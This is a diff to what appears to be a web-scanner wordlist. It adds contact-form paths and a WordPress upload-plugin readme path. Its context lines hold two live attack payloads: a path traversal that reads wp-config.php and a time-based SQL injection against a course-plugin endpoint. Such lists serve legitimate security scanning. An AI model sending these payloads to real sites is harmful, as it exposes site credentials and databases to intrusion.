@@ -88,3 +88,10 @@
 /wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php
 /wp-json/lp/v1/courses/archive-course?&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1
 {{paths}}
+/contact/
+/contact-us/
+/submit/
+/support/
+/form/
+/get-in-touch/
+/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt
